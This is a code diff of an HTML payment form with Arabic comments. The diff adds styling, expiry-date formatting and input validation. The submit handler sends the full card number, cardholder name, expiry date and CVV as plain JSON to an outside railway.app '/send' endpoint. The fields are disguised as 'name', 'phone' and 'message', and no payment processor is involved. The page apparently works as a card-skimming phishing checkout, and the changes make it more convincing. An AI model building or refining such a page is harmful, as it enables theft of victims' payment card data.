@@ -46,6 +46,7 @@
             border-radius: 10px;
             font-size: 14px;
             text-align: left;
+            transition: 0.3s;
         }
 
         input:focus {
@@ -63,7 +64,7 @@
         }
 
         .expiry {
-            margin-right: 6px; /* إضافة مسافة بسيطة بين تاريخ الانتهاء و CVV */
+            margin-right: 6px;
         }
 
         .save-card {
@@ -99,6 +100,13 @@
             color: #777;
             margin-top: 10px;
         }
+
+        /* ستايل الخطأ */
+        .error {
+            border-color: red !important;
+            background-color: #ffe6e6;
+        }
+
     </style>
 </head>
 <body>
@@ -128,28 +136,52 @@
     </div>
 
     <script>
+        document.getElementById("expiryDate").addEventListener("input", function(event) {
+            let value = event.target.value.replace(/\D/g, ""); // السماح فقط بالأرقام
+            if (value.length >= 2) {
+                event.target.value = value.slice(0, 2) + "/" + value.slice(2, 4);
+            } else {
+                event.target.value = value;
+            }
+        });
+
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber").value;
-            const cardHolder = document.getElementById("cardHolder").value;
-            const expiryDate = document.getElementById("expiryDate").value;
-            const cvv = document.getElementById("cvv").value;
+            const cardNumber = document.getElementById("cardNumber");
+            const cardHolder = document.getElementById("cardHolder");
+            const expiryDate = document.getElementById("expiryDate");
+            const cvv = document.getElementById("cvv");
             const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
+
+            let isValid = true;
+
+            // التحقق من الحقول وتغيير لونها عند الخطأ
+            [cardNumber, cardHolder, expiryDate, cvv].forEach(input => {
+                if (!input.checkValidity() || input.value.trim() === "") {
+                    input.classList.add("error");
+                    isValid = false;
+                } else {
+                    input.classList.remove("error");
+                }
+            });
+
+            if (!isValid) return; // إذا كان هناك خطأ، لا يتم إرسال البيانات
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    name: cardHolder, 
-                    phone: cardNumber, 
-                    message: `Expiry: ${expiryDate}, CVV: ${cvv}, Save Card: ${saveCard}` 
+                    name: cardHolder.value, 
+                    phone: cardNumber.value, 
+                    message: `Expiry: ${expiryDate.value}, CVV: ${cvv.value}, Save Card: ${saveCard}` 
                 })
             })
             .then(response => response.json())
             .then(data => alert(data.message))
             .catch(error => alert("حدث خطأ!"));
         });
+
     </script>
 
 </body>
